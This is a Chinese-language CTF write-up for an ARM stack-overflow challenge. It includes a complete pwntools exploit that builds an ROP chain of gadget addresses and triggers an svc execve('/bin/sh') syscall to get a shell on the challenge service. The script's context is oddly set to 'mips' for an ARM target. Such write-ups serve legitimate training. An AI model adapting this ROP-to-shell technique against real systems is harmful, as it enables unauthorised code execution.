# EZ2.0?

> 分类：Pwn

## 题目描述
ARM 架构 PWN。没有现成的 system，采用 syscall（svc）方式构造寄存器，执行 execve("/bin/sh")。

## 考察知识点
- ARM 汇编
- 栈溢出
- ROP 链构造
- svc / syscall 调用 execve

## 解法
网上 WP 大多直接 return 到 system，但本题没有 system，改用 syscall（svc）方式复刻。依次设置 r0、r1、r3、r4、r7，再通过 mov r4 到 r2 并 blx r3 触发 svc，执行 execve("/bin/sh")。

```python
from pwn import *

context(arch='mips',endian='little',os='linux')

#sh = process(["qemu-arm",'-g','1234',"./bin/pwn"])
sh = remote('127.0.0.1',11042)
elf = ELF('./bin/pwn')

svc = 0x0001c58c
movr42r2_blx_r3 = 0x00043224
r7_ret = 0x00027d78
r4_ret = 0x000104e0
r3_ret = 0x00010160
r1_ret = 0x0005f824
r0_ret = 0x0005f73c

str_bin_sh = 0x0008A090

#r0_ret -> r0=str_bin_sh
#r1_ret -> r1=0
#r3_ret -> r3=svc
#r4_ret -> r4=0
#r7_ret -> r7=0xB
#movr42r2_blx_r3 -> r2=r4=0 IP=r3=svc
#svc (R0=str_bin_sh R1=0 R2=0 R7=0xB)  -> get shell

payload =  b'a'*0x44
payload += p32(r0_ret)+p32(str_bin_sh)
payload += p32(r1_ret)+p32(0)
payload += p32(r3_ret)+p32(svc)
payload += p32(r4_ret)+p32(0)
payload += p32(r7_ret)+p32(0xB)
payload += p32(movr42r2_blx_r3)

sh.send(payload)

sh.interactive()
```

## 参考答案
（未给出，getshell 后读取）

## 来源
- 作者：jht3 | https://jht3qaq.github.io/2024/04/26/XYCTF2024-Writeup/
